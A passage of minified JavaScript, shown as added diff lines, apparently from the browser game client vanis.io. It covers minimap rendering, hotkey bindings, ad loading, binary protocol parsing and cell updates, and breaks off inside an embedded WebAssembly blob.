+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(245);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(247);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(249);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(56),
+                a = s.n(i);
+            t.default = a.a
+        }, function(e, t, s) {
+            var i = s(1),
+                a = s(8),
+                n = s(4),
+                o = n.minimapSize,
+                r = n.minimapFPS,
+                l = n.minimapSmoothing,
+                c = new PIXI.Container,
+                h = {};
+
+            function d() {
+                return (new Date).toLocaleTimeString()
+            }
+
+            function p(e, t = !1) {
+                if (t && e < 1) return "instant";
+                e = Math.floor(e);
+                let s = Math.floor(e / 60),
+                    i = Math.floor(s / 60);
+                return s < 1 ? t ? e + "s" : "<1min" : i < 1 ? s + "min" : s % 60 == 0 ? i + "hr" : i + "hr " + s % 60 + "min"
+            }
+            e.exports = {
+                data: () => ({
+                    showMinimap: !1,
+                    showMinimapCircle: !1,
+                    showMinimapStats: !0,
+                    showLocations: n.minimapLocations,
+                    interval: null,
+                    minimapStatsBottom: 10,
+                    showClock: n.showClock,
+                    showSessionTime: n.showSessionTime,
+                    showSpectators: n.showSpectators,
+                    showPlayerCount: n.showPlayerCount,
+                    showRestartTiming: n.showRestartTiming,
+                    systemTime: d(),
+                    sessionTime: p(0, !1),
+                    restartTime: p(0, !0),
+                    spectators: 0,
+                    playerCount: 0,
+                    restartTick: 0,
+                    startTime: null,
+                    gameState: i.state
+                }),
+                computed: {
+                    playerCountDisplayed() {
+                        if (this.gameState.selectedServer) {
+                            var e = this.gameState.selectedServer.slots;
+                            return Math.min(this.playerCount, e) + " / " + e + " players"
+                        }
+                        return this.playerCount + " player" + (1 === this.playerCount ? "" : "s")
+                    }
+                },
+                methods: {
+                    initRenderer(e) {
+                        var t = PIXI.autoDetectRenderer({
+                            resolution: 1,
+                            view: e,
+                            width: o,
+                            height: o,
+                            forceCanvas: !n.useWebGL,
+                            antialias: !1,
+                            powerPreference: "high-performance",
+                            transparent: !0
+                        });
+                        a.destroyPixiPlugins(t), t.clear(), this.renderer = t
+                    },
+                    destroyMinimap() {
+                        c.destroy(!0), c = new PIXI.Container, this.renderer.clear()
+                    },
+                    onMinimapShow() {
+                        this.interval || (this.showMinimap = !0, this.minimapStatsBottom = o + 10, i.events.$on("minimap-positions", this.updatePositions), this.interval = setInterval(this.render, 1e3 / r))
+                    },
+                    onMinimapHide() {
+                        this.interval && (this.showMinimap = !1, this.minimapStatsBottom = 10, i.events.$off("minimap-positions", this.updatePositions), clearInterval(this.interval), this.interval = null, this.spectators = 0, this.playerCount = 0)
+                    },
+                    createNode(e, t, s, i) {
+                        e in h && h[e].destroy(!0), s = s || 16777215, i = i || 16777215;
+                        let a = new PIXI.Container;
+                        a.newPosition = {};
+                        let n = new PIXI.Graphics().beginFill(i).drawCircle(0, 0, 5).endFill();
+                        if (a.addChild(n), t) {
+                            let o = new PIXI.Text(t, {
+                                strokeThickness: 4,
+                                lineJoin: "round",
+                                fontFamily: "Nunito",
+                                fill: s,
+                                fontSize: 12
+                            });
+                            o.anchor.set(.5), o.pivot.y = 15, a.addChild(o)
+                        }
+                        h[e] = a
+                    },
+                    destroyNode(e) {
+                        var t = h[e];
+                        t && (t.destroy(!0), delete h[e])
+                    },
+                    updatePositions(e) {
+                        c.removeChildren();
+                        for (var t = 0; t < e.length; t++) {
+                            var s = e[t],
+                                i = h[s.pid];
+                            i && (i.newPosition.x = s.x * o, i.newPosition.y = s.y * o, c.addChild(i))
+                        }
+                        this.render()
+                    },
+                    render() {
+                        for (var e = c.children, t = l * (30 / r), s = 0; s < e.length; s++) {
+                            var i = e[s];
+                            i.position.x = a.lerp(i.position.x, i.newPosition.x, t), i.position.y = a.lerp(i.position.y, i.newPosition.y, t)
+                        }
+                        this.renderer.render(c)
+                    },
+                    drawLocationGrid(e, t) {
+                        var s = o / t;
+                        e.globalAlpha = .1, e.strokeStyle = "#202020", e.beginPath();
+                        for (var i = 1; i < t; i++) {
+                            var a = i * s;
+                            e.moveTo(a, 0), e.lineTo(a, o), e.moveTo(0, a), e.lineTo(o, a)
+                        }
+                        e.stroke(), e.closePath()
+                    },
+                    drawLocationCodes(e, t) {
+                        var s = o / t,
+                            i = s / 2;
+                        e.globalAlpha = .1, e.font = "14px Nunito", e.textAlign = "center", e.textBaseline = "middle", e.fillStyle = "#ffffff";
+                        for (var a = 0; a < t; a++)
+                            for (var n = a * s + i, r = 0; r < t; r++) {
+                                var l = String.fromCharCode(97 + r).toUpperCase() + (a + 1),
+                                    c = r * s + i;
+                                e.strokeText(l, n, c), e.fillText(l, n, c)
+                            }
+                    },
+                    drawLocations(e) {
+                        e.width = e.height = o;
+                        var t = e.getContext("2d"),
+                            s = o / 2;
+                        if (this.showLocations) {
+                            if (t.save(), this.showMinimapCircle) {
+                                var i = new Path2D;
+                                i.ellipse(s, s, s, s, 0, 0, 2 * Math.PI), t.clip(i)
+                            }
+                            this.drawLocationGrid(t, 5), this.drawLocationCodes(t, 5)
+                        }
+                        t.restore(), this.showMinimapCircle && (t.globalAlpha = .45, t.beginPath(), t.arc(s, s, s + 1, -Math.PI / 2, 0), t.lineTo(o, 0), t.closePath(), t.fill())
+                    }
+                },
+                created() {
+                    i.events.$on("minimap-show", this.onMinimapShow), i.events.$on("minimap-hide", this.onMinimapHide), i.events.$on("minimap-destroy", this.destroyMinimap), i.events.$on("minimap-create-node", this.createNode), i.events.$on("minimap-destroy-node", this.destroyNode), i.events.$on("minimap-show-locations", e => {
+                        this.showLocations = e, this.drawLocations(this.$refs.locations)
+                    }), i.events.$on("minimap-stats-visible", e => this.showMinimapStats = e), i.events.$on("minimap-stats-changed", e => {
+                        this.spectators = e.spectators, this.playerCount = e.playerCount
+                    }), i.events.$on("restart-timing-changed", e => this.restartTick = e), i.events.$on("game-started", () => {
+                        this.showMinimapCircle = i.border.circle, this.drawLocations(this.$refs.locations)
+                    }), i.events.$on("game-stopped", () => this.restartTick = 0), i.events.$on("minimap-stats-invalidate-shown", () => {
+                        this.showClock = n.showClock, this.showSessionTime = n.showSessionTime, this.showSpectators = n.showSpectators, this.showPlayerCount = n.showPlayerCount, this.showRestartTiming = n.showRestartTiming
+                    }), i.events.$on("every-second", () => {
+                        this.systemTime = d();
+                        var e = (Date.now() - this.startTime) / 1e3;
+                        this.sessionTime = p(e, !1), this.restartTick && i.serverTick ? (e = (this.restartTick - i.serverTick) / 25, this.restartTime = p(e, !0)) : this.restartTime = null
+                    })
+                },
+                mounted() {
+                    this.initRenderer(this.$refs.minimap), this.startTime = Date.now()
+                }
+            }
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(251);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(253);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(255);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(257);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(259);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(261);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(263);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(266);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, , function(e, t, s) {
+            let i = s(1),
+                a = s(4),
+                n = s(5),
+                o = i.actions,
+                r = {
+                    toggleAutoRespawn() {
+                        let e = a.autoRespawn;
+                        a.set("autoRespawn", !e), e && i.state.autoRespawning && i.triggerAutoRespawn(!1);
+                        let t = "Auto respawn ";
+                        t += e ? "disabled" : "enabled", n.toast.fire({
+                            type: "info",
+                            title: t,
+                            timer: 1500
+                        })
+                    },
+                    respawn() {
+                        console.log("RESPAWNINIG");
+                        o.join(i.dual.focused), i.showMenu(!1)
+                    },
+                    feed: o.feed.bind(o),
+                    feedMacro: o.feed.bind(o, !0),
+                    split: o.split.bind(o, 1),
+                    splitx2: o.split.bind(o, 2),
+                    splitx3: o.split.bind(o, 3),
+                    splitMax: o.split.bind(o, 4),
+                    split32: o.split.bind(o, 5),
+                    split64: o.split.bind(o, 6),
+                    split128: o.split.bind(o, 7),
+                    split256: o.split.bind(o, 8),
+                    multi1: o.multicombo.bind(o, 1),
+                    multi2: o.multicombo.bind(o, 2),
+                    multi3: o.multicombo.bind(o, 3),
+                    linesplit: o.linesplit.bind(o),
+                    freezeMouse: o.freezeMouse.bind(o),
+                    lockLinesplit: o.lockLinesplit.bind(o),
+                    stopMovement: o.stopMovement.bind(o),
+                    toggleSkins: o.toggleSkins.bind(o),
+                    toggleNames: o.toggleNames.bind(o),
+                    toggleFood: o.toggleFood.bind(o),
+                    toggleMass: o.toggleMass.bind(o),
+                    toggleChat: o.toggleChat.bind(o),
+                    toggleChatToast: o.toggleChatToast.bind(o),
+                    toggleHud: o.toggleHud.bind(o),
+                    spectateLock: o.spectateLockToggle.bind(o),
+                    selectPlayer: o.targetPlayer.bind(o),
+                    saveReplay() {
+                        let {
+                            dual: e
+                        } = i;
+                        i.replay.save(e.focused)
+                    },
+                    zoomLevel1: o.setZoomLevel.bind(o, 1),
+                    zoomLevel2: o.setZoomLevel.bind(o, 2),
+                    zoomLevel3: o.setZoomLevel.bind(o, 3),
+                    zoomLevel4: o.setZoomLevel.bind(o, 4),
+                    zoomLevel5: o.setZoomLevel.bind(o, 5),
+                    multibox() {
+                        let {
+                            dual: e
+                        } = i;
+                        e.switch()
+                    }
+                };
+            window.client && Object.assign(r, {
+                "m-feed": client.feed.bind(client),
+                "m-feedMacro": client.feed.bind(client, !0),
+                "m-split": client.split.bind(client, 1),
+                "m-splitx2": client.split.bind(client, 2),
+                "m-splitx3": client.split.bind(client, 3),
+                "m-splitMax": client.split.bind(client, 4),
+                "m-split32": client.split.bind(client, 5),
+                "m-split64": client.split.bind(client, 6),
+                "m-linesplit": client.lineSplit.bind(client),
+                "m-stopMovement": client.toggleMovement.bind(client),
+                "m-respawn": client.spawn.bind(client),
+                "m-focus": client.focus.bind(client, !0),
+                "m-unfocus": client.focus.bind(client, !1)
+            });
+            let l = {
+                multibox: "TAB",
+                feed: "",
+                feedMacro: "W",
+                split: "SPACE",
+                splitx2: "G",
+                splitx3: "H",
+                splitMax: "T",
+                split32: "",
+                split64: "",
+                split128: "",
+                split256: "",
+                multi1: "",
+                multi2: "",
+                multi3: "",
+                linesplit: "Z",
+                lockLinesplit: "",
+                respawn: "",
+                toggleAutoRespawn: "",
+                stopMovement: "",
+                toggleSkins: "",
+                toggleNames: "",
+                toggleMass: "",
+                spectateLock: "Q",
+                selectPlayer: "MOUSE1",
+                saveReplay: "R",
+                toggleChat: "",
+                toggleChatToast: "",
+                toggleHud: "",
+                zoomLevel1: "1",
+                zoomLevel2: "2",
+                zoomLevel3: "3",
+                zoomLevel4: "4",
+                zoomLevel5: "5"
+            };
+            e.exports = i.hotkeyManager = new class e {
+                constructor() {
+                    this.version = 2, this.pressHandlers = null, this.releaseHandlers = null, this.resetObsoleteHotkeys(), this.load()
+                }
+                resetObsoleteHotkeys() {}
+                load() {
+                    this.hotkeys = this.loadHotkeys(), this.loadHandlers(this.hotkeys)
+                }
+                loadHotkeys() {
+                    let e = Object.assign({}, l),
+                        t = localStorage.hotkeys;
+                    if (!t) return e;
+                    t = JSON.parse(t);
+                    let s = Object.values(t);
+                    return Object.keys(e).forEach(t => {
+                        let i = e[t];
+                        i && s.includes(i) && (e[t] = "")
+                    }), Object.assign(e, t)
+                }
+                saveHotkeys(e) {
+                    localStorage.hotkeys = JSON.stringify(e)
+                }
+                reset() {
+                    return localStorage.removeItem("hotkeys"), this.load(), this.hotkeys
+                }
+                get() {
+                    return this.hotkeys
+                }
+                set(e, t) {
+                    if (!(e in r)) return !1;
+                    if (this.hotkeys[e] === t) return !0;
+                    if (t)
+                        for (let s in this.hotkeys) this.hotkeys[s] === t && (this.hotkeys[s] = "");
+                    return this.hotkeys[e] = t, this.saveHotkeys(this.hotkeys), this.loadHandlers(this.hotkeys), !0
+                }
+                loadHandlers(e) {
+                    for (let t in this.pressHandlers = {}, e) {
+                        if (!(t in r)) continue;
+                        let s = r[t],
+                            i = e[t];
+                        this.pressHandlers[i] = s
+                    }
+                    this.releaseHandlers = {}, "feedMacro" in e && (this.releaseHandlers[e.feedMacro] = o.feed.bind(o, !1)), window.client && "m-feedMacro" in e && (this.releaseHandlers[e["m-feedMacro"]] = client.feed.bind(o, !1))
+                }
+                press(e) {
+                    let t = this.pressHandlers[e];
+                    return !!t && (t(), !0)
+                }
+                release(e) {
+                    let t = this.releaseHandlers[e];
+                    t?.()
+                }
+                convertKey(e) {
+                    return e ? e.toString().toUpperCase().replace(/^(LEFT|RIGHT|NUMPAD|DIGIT|KEY)/, "") : "Unknown"
+                }
+            }
+        }, , , , , , , function(e, t, s) {
+            "use strict";
+            var i = function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return t("div", [t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showMinimapStats,
+                            expression: "showMinimapStats"
+                        }],
+                        staticClass: "minimap-stats",
+                        style: {
+                            bottom: this.minimapStatsBottom + "px"
+                        }
+                    }, [t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showClock,
+                            expression: "showClock"
+                        }]
+                    }, [this._v(this._s(this.systemTime))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showSessionTime,
+                            expression: "showSessionTime"
+                        }]
+                    }, [this._v(this._s(this.sessionTime) + " session")]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showPlayerCount && this.playerCount,
+                            expression: "showPlayerCount && playerCount"
+                        }]
+                    }, [this._v(this._s(this.playerCountDisplayed))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showSpectators && this.spectators,
+                            expression: "showSpectators && spectators"
+                        }]
+                    }, [this._v(this._s(this.spectators) + " spectator" + this._s(1 === this.spectators ? "" : "s"))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showRestartTiming && this.restartTime,
+                            expression: "showRestartTiming && restartTime"
+                        }]
+                    }, [this._v("Restart in " + this._s(this.restartTime))])]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showMinimap,
+                            expression: "showMinimap"
+                        }],
+                        staticClass: "container",
+                        class: {
+                            circle: this.showMinimapCircle
+                        }
+                    }, [t("canvas", {
+                        ref: "locations",
+                        attrs: {
+                            id: "locations"
+                        }
+                    }), this._v(" "), t("canvas", {
+                        ref: "minimap",
+                        attrs: {
+                            id: "minimap"
+                        }
+                    })])])
+                },
+                a = [];
+            i._withStripped = !0, s.d(t, "a", function() {
+                return i
+            }), s.d(t, "b", function() {
+                return a
+            })
+        }, function(e, t, s) {
+            "use strict";
+            var i = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("transition", {
+                        attrs: {
+                            name: "fade",
+                            appear: ""
+                        }
+                    }, [s("div", {
+                        staticClass: "modal"
+                    }, [s("div", {
+                        staticClass: "overlay",
+                        on: {
+                            click: function() {
+                                return e.$emit("close")
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "fas fa-times-circle close-button",
+                        on: {
+                            click: function() {
+                                return e.$emit("close")
+                            }
+                        }
+                    }), e._v(" "), s("div", {
+                        staticClass: "wrapper"
+                    }, [s("transition", {
+                        attrs: {
+                            name: "scale",
+                            appear: ""
+                        }
+                    }, [s("div", {
+                        staticClass: "content fade-box"
+                    }, [e._t("default", [e._v("Here should be something")])], 2)])], 1)])])
+                },
+                a = [];
+            i._withStripped = !0, s.d(t, "a", function() {
+                return i
+            }), s.d(t, "b", function() {
+                return a
+            })
+        }, function(e, t, s) {
+            "use strict";
+            var i = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticClass: "replay-item",
+                        style: {
+                            backgroundImage: "url('" + e.replay.image + "')"
+                        },
+                        on: {
+                            click: function() {
+                                return e.play(e.replay.data)
+                            }
+                        }
+                    }, [s("div", {
+                        staticClass: "replay-header",
+                        on: {
+                            click: function(e) {
+                                e.stopPropagation()
+                            }
+                        }
+                    }, [s("div", {
+                        staticClass: "replay-name"
+                    }, [e._v(e._s(e.replay.name))]), e._v(" "), s("div", [s("i", {
+                        staticClass: "replay-button fas fa-cloud-download-alt",
+                        on: {
+                            click: function(t) {
+                                return t.stopPropagation(), e.downloadReplay(e.replay)
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "replay-button fas fa-trash-alt",
+                        on: {
+                            click: function(t) {
+                                return t.stopPropagation(), e.deleteReplay(e.replay.name)
+                            }
+                        }
+                    })])])])
+                },
+                a = [];
+            i._withStripped = !0, s.d(t, "a", function() {
+                return i
+            }), s.d(t, "b", function() {
+                return a
+            })
+        }, function(e, t) {
+            t.neon = [16776960, 65280, 65535, 16711935], t.basic = [16711680, 16744448, 16776960, 8453888, 65280, 65408, 65535, 33023, 8388863, 16711935, 16711808], t.basicd = t.basic.map(e => {
+                var t = e >> 16 & 255,
+                    s = e >> 8 & 255,
+                    i = 255 & e;
+                return (t *= .5) << 16 | (s *= .5) << 8 | (i *= .5) >> 0
+            })
+        }, function(e) {
+            var t = new class {
+                constructor() {
+                    this.ads = {}
+                }
+                addAd(e, t, s) {
+                    this.ads[e] = {
+                        elementId: t,
+                        lastRefresh: 0,
+                        waitInterval: s || 0
+                    }
+                }
+                getAd(e) {
+                    return this.ads[e] || null
+                }
+                pushAd(e) {
+                    aiptag.cmd.display.push(function() {
+                        aipDisplayTag.display(e)
+                    })
+                }
+                refreshAd(e) {
+                    var t = this.getAd(e);
+                    if (!t) return !1;
+                    var s = Date.now();
+                    return !(t.lastRefresh + 1e3 * t.waitInterval > s) && (t.lastRefresh = s, this.pushAd(t.elementId), !0)
+                }
+            };
+            t.addAd("menu-box", "vanis-io_300x250", 30), t.addAd("menu-banner", "vanis-io_728x90", 120), t.addAd("death-box", "vanis-io_300x250_2", 30), e.exports = {
+                loadAdinplay(e) {
+                    var t = window.aiptag = t || {};
+                    t.cmd = t.cmd || [], t.cmd.display = t.cmd.display || [], t.gdprShowConsentTool = !0;
+                    var s = document.createElement("script");
+                    s.onload = e, s.src = "//api.adinplay.com/libs/aiptag/pub/VAN/vanis.io/tag.min.js", document.head.appendChild(s)
+                },
+                refreshAd: e => t.refreshAd(e)
+            }
+        }, function(e) {
+            let t = e => {
+                let t = {
+                    border: {},
+                    food: {}
+                };
+                if (t.protocol = e.readUInt8(), t.protocol >= 4) {
+                    t.gamemodeId = e.readUInt8(), t.instanceSeed = e.readUInt16LE(), t.playerId = e.readUInt16LE(), t.border.minx = e.readInt16LE(), t.border.miny = e.readInt16LE(), t.border.maxx = e.readInt16LE(), t.border.maxy = e.readInt16LE(), t.flags = e.readUInt8(), t.border.circle = !!(1 & t.flags), t.border.width = t.border.maxx - t.border.minx, t.border.height = t.border.maxy - t.border.miny;
+                    let {
+                        food: s
+                    } = t;
+                    if (2 & t.flags) {
+                        let i = s.minSize = e.readUInt16LE(),
+                            a = s.maxSize = e.readUInt16LE();
+                        s.stepSize = a - i
+                    }
+                    4 & t.flags && (s.ejectedSize = e.readUInt16LE())
+                } else {
+                    if (t.protocol >= 2) t.gamemodeId = e.readUInt8(), t.instanceSeed = e.readUInt16LE(), t.playerId = e.readUInt16LE(), t.border.width = e.readUInt32LE(), t.border.height = e.readUInt32LE();
+                    else {
+                        t.gamemodeId = 1, t.instanceSeed = e.readInt16LE(), t.playerId = e.readInt16LE();
+                        let n = e.readUInt16LE();
+                        t.border.width = n, t.border.height = n
+                    }
+                    t.border.minx = -t.border.width / 2, t.border.miny = -t.border.height / 2, t.border.maxx = +t.border.width / 2, t.border.maxy = +t.border.height / 2
+                }
+                return t.border.x = (t.border.minx + t.border.maxx) / 2, t.border.y = (t.border.miny + t.border.maxy) / 2, t
+            };
+            e.exports = t
+        }, function(e, t, s) {
+            let i = s(1),
+                a = s(4),
+                {
+                    PlayerCell: n,
+                    Virus: o,
+                    EjectedMass: r,
+                    Food: l,
+                    Crown: c,
+                    DeadCell: h
+                } = s(133),
+                d = s(14),
+                {
+                    clampNumber: p
+                } = s(8);
+            class u extends d {
+                constructor(e) {
+                    //let t = new PIXI.BaseTexture(e),
+                    //    s = new PIXI.Texture(t);
+                    //e.texture = s;
+                    e.texture = PIXI.Texture.from("/img/coin.png"), 
+                    super(e);
+                    this.sprite.alpha = 0;
+                }
+            }
+            u.prototype.type = 9, u.prototype.isCoin = !0;
+            let g = (e, t, s, a, d, p, g, A, m = 1) => {
+                    let v = 15 & e;
+                    if ((3 == v || 4 == v) && (void 0 == a || void 0 == p)) {
+                        let {
+                            food: f
+                        } = i, C = p = 3 == v ? f.ejectedSize || 1 : f.minSize + s % f.stepSize || 1;
+                        if (4 == v) {
+                            let {
+                                border: y
+                            } = i;
+                            a = y.minx + C + (y.width - 2 * C) * i.seededRandom(65536 + s), d = y.miny + C + (y.height - 2 * C) * i.seededRandom(131072 + s)
+                        }
+                    }
+                    let {
+                        dual: w
+                    } = i, {
+                        cells: I
+                    } = 1 & m ? i : w, k;
+                    if (I.has(s))(k = I.get(s)).update(), k.ox = k.x, k.oy = k.y, k.oSize = k.size;
+                    else {
+                        let b = {
+                                type: e,
+                                id: s,
+                                pid: t,
+                                x: a,
+                                y: d,
+                                size: p,
+                                flags: g,
+                                context: m
+                            },
+                            _ = !1;
+                        if (w.opened) {
+                            let {
+                                cells: S
+                            } = 2 & m ? i : w;
+                            if (S.has(s)) {
+                                if (1 != v) return;
+                                k = S.get(s), k.activeContexts++, I.set(s, k), _ = !0
+                            }
+                        }
+                        switch (v) {
+                            case 1: {
+                                if (_) break;
+                                let E = i.playerManager.getPlayer(t);
+                                if (!E) return;
+                                b.texture = E.texture, k = new n(b, E);
+                                break
+                            }
+                            case 2:
+                                k = new o(b);
+                                break;
+                            case 3:
+                                k = new r(b);
+                                break;
+                            case 4:
+                                k = new l(b);
+                                break;
+                            case 6:
+                                k = new c(b);
+                                break;
+                            case 9:
+                                k = new u(b);
+                                break;
+                            default: {
+                                let x = 4210752,
+                                    B = !1;
+                                g > 1 && (x = 0, 128 & g && (x |= 7340032), 64 & g && (x |= 28672), 32 & g && (x |= 112), 16 & g && (B = !0)), k = new h(b, x, B)
+                            }
+                        }
+                        if (!_) {
+                            let {
+                                scene: Q
+                            } = i;
+                            Q[1 & g ? "addFood" : "addCell"](k.sprite)
+                        }
+                        I.set(s, k)
+                    }
+                    void 0 != a && (k.nx = a, k.ny = d), void 0 != p && (k.nSize = p), k.updateStamp = i.timeStamp;
+                    let {
+                        player: M
+                    } = k;
+                    if (!M || 2 & m) return;
+                    let {
+                        replay: T
+                    } = i;
+                    T.recording() ? M.lastUpdateTick = A : delete M.lastUpdateTick
+                },
+                A = (e, t, s) => {
+                    let {
+                        cells: n
+                    } = 1 & s ? i : i.dual;
+                    if (!n.has(e)) return;
+                    let o = n.get(e);
+                    if (o.destroyed) return;
+                    if (!n.has(t)) return void o.destroy(s);
+                    let r = n.get(t);
+                    if (o.update(), !o.destroy(s, a.eatAnimation)) return;
+                    o.nx = r.nx, o.ny = r.ny;
+                    let l = o.nSize;
+                    o.nSize = 0, o.newPositionScale = p(l / r.nSize, 0, 1), o.updateStamp = i.timeStamp
+                },
+                m = (e, t) => {
+                    let {
+                        cells: s
+                    } = 1 & t ? i : i.dual;
+                    s.has(e) && s.get(e).destroy(t)
+                },
+                v = new class e {
+                    async init() {
+                        if (this.initializing || this.instance) return !1;
+                        this.initializing = !0;
+                        let e = await fetch("data:application/wasm;base64,AGFzbQEAAAABKAdgAX8Bf2ABfwBgA39/fwBgAAF/YAAAYAJ/fwBgCX9/f39/f39/fwACUQQDZW52C2FkZE9yVXBkYXRlAAYDZW52B2Rlc3Ryb3kABQNlbnYDZWF0AAIDZW52H2Vtc2NyaXB0ZW5fbm90aWZ5X21lbW9yeV9ncm93dGgAAQMLCgQCAwAAAAEDAQAEBQFwAQICBQcBAYACgIACBgkBfwFBgIzAAgsHjQEKBm1lbW9yeQIAC2Rlc2VyaWFsaXplAAULX2luaXRpYWxpemUABBlfX2luZGlyZWN0X2Z1bmN0aW9uX3RhYmxlAQAQX19lcnJub19sb2NhdGlvbgAGCXN0YWNrU2F2ZQALDHN0YWNrUmVzdG9yZQAMCnN0YWNrQWxsb2MADQZtYWxsb2MACQRmcmVlAAoJBwEAQQELAQQKjT8KAwABC6oEAQt/QQEhAyAALQAAIgYEQANAIAZB/wFxIQhBACEKAkAgBkEfcUEBRwRAQQAhCwwBCyAAIAVqLQACIAAgA2otAABBCHRyIQsgBUEDaiEDCyAAIANqIgUvAAAhByADQQJqIQQCQCAIQSBxBEBBACEMDAELIAUtAAMgACAEai0AAEEIdHIhCiAFLwAEIgRBCHQgBEEIdnIhDCADQQZqIQQLIAdBCHYhBSAHQQh0IQlBACEDAkAgCEHAAHEEQEEAIQcMAQsgACAEai8AACIHQQh0IAdBCHZyIQcgBEECaiEECyAGQQ9xIQ0gBSAJciEJIAZBGHRBGHVBf0oEfyAEBSAAIARqLQAAIQMgBEEBagshBSACIAggCyAJQf//A3EgCkEQdEEQdSAMQRB0QRB1IAdB//8DcSADIA1BBEYgA0H/AXFBD0tyckH/AXEgARAAIAVBAWohAyAAIAVqLQAAIgYNAAsLIANBAmohBAJAIAAgBWotAAIgACADai0AAEEIdHIiBUUEQCADIQYMAQsDQCACIAAgA2otAAMgACAEIgZqLQAAQQh0chABIARBAmohBCAGIQMgBUEBayIFQf//A3ENAAsLIAAgBmotAAMgACAEai0AAEEIdHIiAwRAA0AgACAGaiEBIAIgACAGQQRqIgZqLwAAIgRBCHQgBEEIdnJB//8DcSABLwAGIgFBCHQgAUEIdnJB//8DcRACIANBAWsiA0H//wNxDQALCwsFAEGECAsjACAAPwBBEHRrQf//A2pBEHZAAEF/RgRAQQAPC0EAEANBAQtSAQJ/QYAIKAIAIgEgAEEDakF8cSICaiEAAkAgAkEBTkEAIAAgAU0bDQA/AEEQdCAASQRAIAAQB0UNAQtBgAggADYCACABDwtBhAhBMDYCAEF/C5ctAQx/IwBBEGsiDCQAAkACQAJAAkACQAJAAkACQAJAAkACQAJAIABB9AFNBEBBiAgoAgAiBUEQIABBC2pBeHEgAEELSRsiCEEDdiICdiIBQQNxBEAgAUF/c0EBcSACaiIDQQN0IgFBuAhqKAIAIgRBCGohAAJAIAQoAggiAiABQbAIaiIBRgRAQYgIIAVBfiADd3E2AgAMAQsgAiABNgIMIAEgAjYCCAsgBCADQQN0IgFBA3I2AgQgASAEaiIBIAEoAgRBAXI2AgQMDQsgCEGQCCgCACIKTQ0BIAEEQAJAQQIgAnQiAEEAIABrciABIAJ0cSIAQQAgAGtxQQFrIgAgAEEMdkEQcSICdiIBQQV2QQhxIgAgAnIgASAAdiIBQQJ2QQRxIgByIAEgAHYiAUEBdkECcSIAciABIAB2IgFBAXZBAXEiAHIgASAAdmoiA0EDdCIAQbgIaigCACIEKAIIIgEgAEGwCGoiAEYEQEGICCAF